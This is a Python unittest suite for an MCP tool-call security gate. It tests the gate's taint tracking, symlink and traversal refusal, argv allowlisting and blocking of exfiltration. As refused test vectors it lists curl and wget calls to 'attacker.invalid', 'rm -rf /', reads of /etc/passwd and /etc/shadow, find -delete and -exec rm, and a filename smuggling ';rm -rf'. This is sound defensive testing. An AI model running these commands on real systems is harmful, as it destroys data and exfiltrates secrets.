#!/usr/bin/env python3
import json
import os
import select
import shutil
import subprocess
import sys
import tempfile
import unittest

REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
GATE_BIN = os.environ.get("MCP_GATE_BIN", os.path.join(REPO_ROOT, "mcp-dfa-gate"))

E_PARSE = -32700
E_INVALID = -32600
E_INVALID_PARAMS = -32602
E_POLICY = -32001
E_CANON = -32002
E_METHOD_BLOCKED = -32004

STUB_SERVER_SOURCE = r'''
import json, subprocess, sys

LOG_PATH = sys.argv[1]

# Defense in depth: the stub re-validates the forwarded argv against its own
# copy of the vetted program allowlist and execs with shell=False. The gate
# is the policy authority; this proves the two layers agree on the typed
# contract (v0.6 H4: execv(3)-style execution, never a shell).
STUB_VETTED = {"ls", "cat", "head", "tail", "grep",
               "find", "wc", "diff", "stat", "sha256sum"}

def log(line):
    with open(LOG_PATH, "a") as f:
        f.write(line + "\n")

def run_bash_workspace(argv):
    if (not isinstance(argv, list) or not argv or
            not all(isinstance(a, str) and a for a in argv)):
        return "stub: argv must be a non-empty array of non-empty strings", True
    if argv[0] not in STUB_VETTED:
        return "stub: program not in stub allowlist: %r" % argv[0], True
    try:
        proc = subprocess.run(argv, shell=False, stdin=subprocess.DEVNULL,
                              stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                              timeout=10)
    except Exception as e:
        return "stub: exec failed: %s" % e, True
    text = proc.stdout.decode("ascii", "replace")
    return text[:65536], proc.returncode != 0

for raw in sys.stdin:
    line = raw.strip()
    if not line:
        continue
    log(line)
    try:
        msg = json.loads(line)
    except Exception:
        sys.stdout.write(json.dumps({
            "jsonrpc": "2.0", "id": None,
            "error": {"code": -32700, "message": "stub parse error"}}) + "\n")
        sys.stdout.flush()
        continue
    if "method" not in msg or "id" not in msg:
        continue
    method = msg["method"]
    rid = msg["id"]
    if method == "initialize":
        resp = {"jsonrpc": "2.0", "id": rid, "result": {
            "protocolVersion": "2024-11-05",
            "capabilities": {"tools": {}},
            "serverInfo": {"name": "stub", "version": "0.0.1"}}}
    elif method == "ping":
        resp = {"jsonrpc": "2.0", "id": rid, "result": {}}
    elif method == "tools/list":
        resp = {"jsonrpc": "2.0", "id": rid, "result": {"tools": []}}
    elif method == "tools/call":
        name = (msg.get("params") or {}).get("name")
        args = (msg.get("params") or {}).get("arguments") or {}
        if name == "bash_workspace":
            text, is_err = run_bash_workspace(args.get("argv"))
        else:
            text, is_err = "stub-ok", False
        resp = {"jsonrpc": "2.0", "id": rid, "result": {
            "content": [{"type": "text", "text": text}], "isError": is_err}}
    else:
        resp = {"jsonrpc": "2.0", "id": rid,
                "error": {"code": -32601, "message": "stub: unknown method"}}
    sys.stdout.write(json.dumps(resp) + "\n")
    sys.stdout.flush()
'''


def err_code(resp):
    return resp.get("error", {}).get("code")


class GateSession:
    def __init__(self, tmpdir):
        self.tmpdir = tmpdir
        self.ws = os.path.join(tmpdir, "ws")
        os.makedirs(os.path.join(self.ws, "secrets"))
        os.makedirs(os.path.join(self.ws, "sub"))
        self.prefix = self.ws + "/"
        with open(os.path.join(self.ws, "readme.txt"), "w") as f:
            f.write("hello\n")
        with open(os.path.join(self.ws, "secrets", ".env"), "w") as f:
            f.write("SECRET=1\n")
        with open(os.path.join(self.ws, "KEY.PEM"), "w") as f:
            f.write("-----BEGIN KEY-----\n")
        with open(os.path.join(self.ws, "sub", "deep.txt"), "w") as f:
            f.write("deep\n")
        os.symlink("/", os.path.join(self.ws, "escape_root"))
        os.symlink("/etc/hostname" if os.path.exists("/etc/hostname") else "/etc/hosts",
                   os.path.join(self.ws, "escape_file"))

        self.stub_path = os.path.join(tmpdir, "stub_server.py")
        self.stub_log = os.path.join(tmpdir, "stub_log")
        with open(self.stub_path, "w") as f:
            f.write(STUB_SERVER_SOURCE)
        self.gate_err = open(os.path.join(tmpdir, "gate_stderr.log"), "w")
        # cwd = workspace root: the deployment model (scripts/run_confined.sh
        # --chdir SAFE_PREFIX) runs the downstream with cwd pinned to the
        # workspace, so relative argv paths resolve there.
        self.proc = subprocess.Popen(
            [GATE_BIN, self.prefix, "--", sys.executable, self.stub_path, self.stub_log],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=self.gate_err,
            cwd=self.ws)
        self._next_id = 0

    def call(self, method, params=None, timeout=10.0):
        self._next_id += 1
        msg = {"jsonrpc": "2.0", "id": self._next_id, "method": method}
        if params is not None:
            msg["params"] = params
        resp = self.send_line(json.dumps(msg), timeout=timeout)
        if isinstance(resp.get("id"), int) and resp["id"] != self._next_id:
            raise AssertionError("response id mismatch: %r" % resp)
        return resp

    def send_line(self, line, timeout=10.0):
        self.send_bytes((line + "\n").encode("ascii"))
        return self.read_response(timeout)

    def send_notification(self, method, params=None):
        msg = {"jsonrpc": "2.0", "method": method}
        if params is not None:
            msg["params"] = params
        self.send_bytes((json.dumps(msg) + "\n").encode("ascii"))

    def send_bytes(self, data):
        try:
            self.proc.stdin.write(data)
            self.proc.stdin.flush()
        except OSError:
            pass

    def read_response(self, timeout=10.0):
        ready, _, _ = select.select([self.proc.stdout], [], [], timeout)
        if not ready:
            raise AssertionError("gate timed out after %.1fs" % timeout)
        line = self.proc.stdout.readline()
        if not line:
            raise AssertionError("gate closed stdout (unexpected EOF)")
        return json.loads(line.decode("ascii", "replace"))

    def stub_entries(self):
        if not os.path.exists(self.stub_log):
            return []
        with open(self.stub_log) as f:
            return [json.loads(l) for l in f if l.strip()]

    def forwarded_calls(self):
        return [m for m in self.stub_entries() if m.get("method") == "tools/call"]

    def close(self):
        if self.proc.poll() is None:
            try:
                self.proc.stdin.close()
            except OSError:
                pass
            try:
                self.proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.proc.kill()
                self.proc.wait()
        if self.gate_err and not self.gate_err.closed:
            self.gate_err.close()


@unittest.skipUnless(sys.platform.startswith("linux"), "gate is Linux-only (openat2)")
class GateTestBase(unittest.TestCase):
    def setUp(self):
        if not os.path.exists(GATE_BIN):
            self.skipTest("gate binary not found at %s; build it first" % GATE_BIN)
        self.tmpdir = tempfile.mkdtemp(prefix="mcp-gate-test-")
        self.session = GateSession(self.tmpdir)
        if os.environ.get("MCP_GATE_KEEP"):
            sys.stderr.write("keeping %s\n" % self.tmpdir)
        else:
            self.addCleanup(shutil.rmtree, self.tmpdir, ignore_errors=True)

    def tearDown(self):
        self.session.close()


class TestHandshakeAndPolicy(GateTestBase):
    def test_passthrough_metadata_methods(self):
        r = self.session.call("initialize", {"protocolVersion": "2024-11-05"})
        self.assertNotIn("error", r)
        self.assertEqual(r["result"]["serverInfo"]["name"], "stub")
        self.assertNotIn("error", self.session.call("ping"))
        self.assertNotIn("error", self.session.call("tools/list"))
        self.assertEqual(self.session.forwarded_calls(), [])

    def test_method_allowlist_fail_closed(self):
        for method in ("resources/list", "resources/read", "prompts/list",
                       "sampling/createMessage", "completion/complete"):
            r = self.session.call(method, {})
            self.assertEqual(err_code(r), E_METHOD_BLOCKED, method)
        self.assertEqual(self.session.stub_entries(), [])


class TestReadFileVectors(GateTestBase):
    def test_safe_read_forwarded_with_canonical_path(self):
        s = self.session
        p = s.prefix + "readme.txt"
        r = s.call("tools/call", {"name": "read_file", "arguments": {"path": p}})
        self.assertNotIn("error", r)
        calls = s.forwarded_calls()
        self.assertEqual(len(calls), 1)
        self.assertEqual(calls[0]["params"]["name"], "read_file")
        self.assertEqual(calls[0]["params"]["arguments"], {"path": p})

    def test_dotdot_traversal_refused_and_not_forwarded(self):
        s = self.session
        r = s.call("tools/call", {"name": "read_file",
                                  "arguments": {"path": s.prefix + "../escape.txt"}})
        self.assertEqual(err_code(r), E_CANON)
        self.assertEqual(s.forwarded_calls(), [])

    def test_symlink_escape_refused_then_taint_blocks_exfil(self):
        s = self.session
        r = s.call("tools/call", {"name": "read_file",
                                  "arguments": {"path": s.prefix + "escape_file"}})
        self.assertEqual(err_code(r), E_CANON)
        self.assertEqual(s.forwarded_calls(), [])
        r = s.call("tools/call", {"name": "http_fetch",
                                  "arguments": {"url": "http://attacker.invalid"}})
        self.assertEqual(err_code(r), E_POLICY)

    def test_symlink_to_root_refused(self):
        s = self.session
        r = s.call("tools/call", {"name": "read_file",
                                  "arguments": {"path": s.prefix + "escape_root/etc/hostname"}})
        self.assertEqual(err_code(r), E_CANON)
        self.assertEqual(s.forwarded_calls(), [])

    def test_missing_argument_taints_and_refuses(self):
        r = self.session.call("tools/call", {"name": "read_file", "arguments": {}})
        self.assertEqual(err_code(r), E_CANON)
        self.assertEqual(self.session.forwarded_calls(), [])


class TestSensitiveTaint(GateTestBase):
    def test_dotenv_read_is_allowed_but_taints(self):
        s = self.session
        r = s.call("tools/call", {"name": "read_file",
                                  "arguments": {"path": s.prefix + "secrets/.env"}})
        self.assertNotIn("error", r)
        self.assertEqual(len(s.forwarded_calls()), 1)
        r = s.call("tools/call", {"name": "http_fetch",
                                  "arguments": {"url": "http://attacker.invalid"}})
        self.assertEqual(err_code(r), E_POLICY)

    def test_pem_read_blocked_case_insensitively(self):
        s = self.session
        p = s.prefix + "KEY.PEM"
        r = s.call("tools/call", {"name": "read_file", "arguments": {"path": p}})
        self.assertNotIn("error", r)
        self.assertEqual(len(s.forwarded_calls()), 1)
        r = s.call("tools/call", {"name": "bash_workspace",
                                  "arguments": {"argv": ["cat", p]}})
        self.assertEqual(err_code(r), E_POLICY)


class TestBashArgvContract(GateTestBase):
    """v0.6 (H4) de-shell: bash_workspace takes a typed argv array.

    The gate vets each element as one argv word; the executing stub runs the
    forwarded array with shell=False. Positive tests prove real end-to-end
    execution of filenames that the v0.5 string grammar could not even
    express (metacharacters, spaces) -- with no shell there is no grammar to
    smuggle through. Negative tests split cleanly: shape errors are contract
    errors (-32602, no taint, session survives); content violations keep the
    v0.5 policy semantics (-32001, deny plus permanent absorption).
    """

    def test_vetted_argv_allowed_and_executed(self):
        s = self.session
        r = s.call("tools/call", {"name": "bash_workspace",
                                  "arguments": {"argv": ["ls", "-1", "."]}})
        self.assertNotIn("error", r)
        self.assertFalse(r["result"]["isError"])
        self.assertIn("readme.txt", r["result"]["content"][0]["text"])
        calls = s.forwarded_calls()
        self.assertEqual(len(calls), 1)
        self.assertEqual(calls[0]["params"]["arguments"]["argv"],
                         ["ls", "-1", "."])

    def test_argv_absolute_path_inside_prefix_executes(self):
        s = self.session
        argv = ["sha256sum", s.prefix + "readme.txt"]
        r = s.call("tools/call", {"name": "bash_workspace",
                                  "arguments": {"argv": argv}})
        self.assertNotIn("error", r)
        self.assertFalse(r["result"]["isError"])
        import hashlib
        digest = hashlib.sha256(b"hello\n").hexdigest()
        self.assertEqual(r["result"]["content"][0]["text"].split()[0], digest)
        self.assertEqual(s.forwarded_calls()[0]["params"]["arguments"]["argv"], argv)

    def test_argv_metachar_filename_no_shell_parsing(self):
        # Flagship de-shell proof: 'note;rm -rf.txt' is a filename, not
        # grammar. The gate forwards it verbatim and the executor cats the
        # actual file -- impossible under the v0.5 string contract.
        s = self.session
        with open(os.path.join(s.ws, "note;rm -rf.txt"), "w") as f:
            f.write("semicolon-data\n")
        r = s.call("tools/call", {"name": "bash_workspace",
                                  "arguments": {"argv": ["cat", "note;rm -rf.txt"]}})
        self.assertNotIn("error", r)
        self.assertFalse(r["result"]["isError"])
        self.assertEqual(r["result"]["content"][0]["text"], "semicolon-data\n")
        self.assertEqual(s.forwarded_calls()[0]["params"]["arguments"]["argv"],
                         ["cat", "note;rm -rf.txt"])

    def test_argv_filename_with_spaces_executes_verbatim(self):
        s = self.session
        with open(os.path.join(s.ws, "my report v2.txt"), "w") as f:
            f.write("spaced\n")
        r = s.call("tools/call", {"name": "bash_workspace",
                                  "arguments": {"argv": ["cat", "my report v2.txt"]}})
        self.assertNotIn("error", r)
        self.assertFalse(r["result"]["isError"])
        self.assertEqual(r["result"]["content"][0]["text"], "spaced\n")

    def test_argv_relative_subpath_executes(self):
        s = self.session
        r = s.call("tools/call", {"name": "bash_workspace",
                                  "arguments": {"argv": ["cat", "sub/deep.txt"]}})
        self.assertNotIn("error", r)
        self.assertFalse(r["result"]["isError"])
        self.assertEqual(r["result"]["content"][0]["text"], "deep\n")

    def test_legacy_command_string_rejected_cleanly(self):
        # Migration path: the v0.5 'command' string is a contract error, not
        # a policy event. Clean -32602 with an actionable hint; the session
        # must survive so a migrating client can read the message and adapt.
        s = self.session
        r = s.call("tools/call", {"name": "bash_workspace",
                                  "arguments": {"command": "ls ."}})
        self.assertEqual(err_code(r), E_INVALID_PARAMS)
        self.assertIn("no longer accepted", r["error"]["message"])
        self.assertEqual(s.forwarded_calls(), [])
        r = s.call("tools/call", {"name": "read_file",
                                  "arguments": {"path": s.prefix + "readme.txt"}})
        self.assertNotIn("error", r)

    def test_argv_shape_errors_rejected_without_taint(self):
        s = self.session
        bad_shapes = [
            {},                                    # argv missing
            {"argv": "ls"},                        # not an array
            {"argv": 7},                           # not an array
            {"argv": []},                          # empty array
            {"argv": [42]},                        # non-string element
            {"argv": ["cat", ""]},                 # empty-string element
            {"argv": ["cat", "a\u0000b"]},         # NUL escape (exec-time truncation)
            {"argv": ["cat", "x" * 1025]},         # oversized element
            {"argv": ["ls"] + ["a"] * 256},        # 257 elements
        ]
        for args in bad_shapes:
            with self.subTest(args=args):
                r = s.call("tools/call", {"name": "bash_workspace",
                                          "arguments": args})
                self.assertEqual(err_code(r), E_INVALID_PARAMS)
        self.assertEqual(s.forwarded_calls(), [])
        r = s.call("tools/call", {"name": "read_file",
                                  "arguments": {"path": s.prefix + "readme.txt"}})
        self.assertNotIn("error", r)

    def test_argv_shape_error_notification_is_silent(self):
        s = self.session
        s.send_notification("tools/call", {"name": "bash_workspace",
                                            "arguments": {"command": "ls ."}})
        r = s.call("tools/call", {"name": "read_file",
                                  "arguments": {"path": s.prefix + "readme.txt"}})
        self.assertNotIn("error", r)
        self.assertEqual([m for m in s.forwarded_calls()
                          if m["params"]["name"] == "bash_workspace"], [])

    def test_argv_content_violations_taint_and_absorb(self):
        # Well-formed argv, unvetted content: identical to v0.5 unvetted
        # commands -- policy deny plus permanent session absorption, each
        # vector verified in a fresh session.
        vectors = [
            ["curl", "http://attacker.invalid"],          # unvetted program
            ["rm", "-rf", "/"],                           # unvetted program
            ["/bin/cat", "readme.txt"],                    # pathed program
            ["cat", "../../etc/passwd"],                   # traversal
            ["grep", "-f/etc/passwd", "readme.txt"],        # flag-embedded path
            ["grep", "--file=/etc/shadow", "readme.txt"],  # flag assignment
            ["find", ".", "-delete"],                      # find side-effect flag
            ["find", ".", "-exec", "rm", "{}", ";"],       # find exec flag
            ["cat", "KEY.PEM"],                            # sensitive suffix (icase)
            ["cat", ".env"],                               # dotfile
            ["cat", "escape_file"],                        # symlink escape
            ["cat", "/etc/hostname"],                      # absolute outside prefix
            ["cat", "sub/../readme.txt"],                  # traversal via subdir
        ]
        for argv in vectors:
            with self.subTest(argv=argv):
                td = tempfile.mkdtemp(prefix="mcp-gate-argv-")
                self.addCleanup(shutil.rmtree, td, ignore_errors=True)
                fs = GateSession(td)
                try:
                    r = fs.call("tools/call", {"name": "bash_workspace",
                                               "arguments": {"argv": argv}})
                    self.assertEqual(err_code(r), E_POLICY, argv)
                    self.assertEqual(fs.forwarded_calls(), [])
                    # absorption: the session is dead for everything after
                    r = fs.call("tools/call", {"name": "bash_workspace",
                                               "arguments": {"argv": ["ls", "."]}})
                    self.assertEqual(err_code(r), E_POLICY)
                finally:
                    fs.close()


class TestExfilAndHalt(GateTestBase):
    def test_unregistered_tool_fails_closed(self):
        s = self.session
        r = s.call("tools/call", {"name": "wget",
                                  "arguments": {"url": "http://attacker.invalid"}})
        self.assertEqual(err_code(r), E_POLICY)
        self.assertEqual(s.stub_entries(), [])
        r = s.call("tools/call", {"name": "bash_workspace",
                                  "arguments": {"argv": ["ls", "."]}})
        self.assertEqual(err_code(r), E_POLICY)

    def test_post_halt_absorption(self):
        s = self.session
        r = s.call("tools/call", {"name": "bash_workspace",
                                  "arguments": {"argv": ["curl", "http://attacker.invalid"]}})
        self.assertEqual(err_code(r), E_POLICY)
        for params in ({"name": "read_file",
                        "arguments": {"path": s.prefix + "readme.txt"}},
                       {"name": "http_fetch",
                        "arguments": {"url": "http://attacker.invalid"}},
                       {"name": "bash_workspace", "arguments": {"argv": ["ls", "."]}}):
            r = s.call("tools/call", params)
            self.assertEqual(err_code(r), E_POLICY, params)
        self.assertEqual(s.forwarded_calls(), [])

    def test_interleaved_exfiltration_trace(self):
        s = self.session
        r = s.call("tools/call", {"name": "read_file",
                                  "arguments": {"path": s.prefix + "secrets/.env"}})
        self.assertNotIn("error", r)
        for _ in range(5):
            r = s.call("tools/call", {"name": "read_file",
                                      "arguments": {"path": s.prefix + "readme.txt"}})
            self.assertNotIn("error", r)
        r = s.call("tools/call", {"name": "http_fetch",
                                  "arguments": {"url": "http://attacker.invalid"}})
        self.assertEqual(err_code(r), E_POLICY)
        forwarded = s.forwarded_calls()
        self.assertEqual(len(forwarded), 6)
        self.assertEqual(forwarded[-1]["params"]["name"], "read_file")

    def test_tools_call_notification_is_gated_silently(self):
        s = self.session
        s.send_notification("tools/call", {"name": "wget", "arguments": {}})
        r = s.call("tools/call", {"name": "read_file",
                                  "arguments": {"path": s.prefix + "readme.txt"}})
        self.assertEqual(err_code(r), E_POLICY)
        self.assertEqual(s.stub_entries(), [])


class TestTransport(GateTestBase):
    def test_duplicate_keys_rejected(self):
        s = self.session
        line = ('{"jsonrpc":"2.0","id":7,"method":"tools/call",'
                '"id":8,"params":{"name":"read_file","arguments":'
                '{"path":"' + s.prefix + 'readme.txt"}}}')
        r = s.send_line(line)
        self.assertEqual(err_code(r), E_PARSE)
        self.assertEqual(s.stub_entries(), [])

    def test_non_ascii_transport_rejected(self):
        s = self.session
        payload = b'{"jsonrpc":"2.0","id":1,"method":"ping","params":{"note":"\xff"}}'
        s.send_bytes(payload + b"\n")
        r = s.read_response()
        self.assertEqual(err_code(r), E_PARSE)
        self.assertNotIn("error", s.call("ping"))

    def test_oversized_line_terminates_gate_fail_closed(self):
        s = self.session
        blob = b'{"id":1,"method":"ping","params":{"pad":"' + b"A" * (2 * 1024 * 1024) + b'"}}'
        s.send_bytes(blob + b"\n")
        self.assertEqual(s.proc.stdout.readline(), b"")
        self.assertEqual(s.proc.wait(timeout=10), 0)
        self.assertEqual(s.stub_entries(), [])


if __name__ == "__main__":
    unittest.main(verbosity=2)
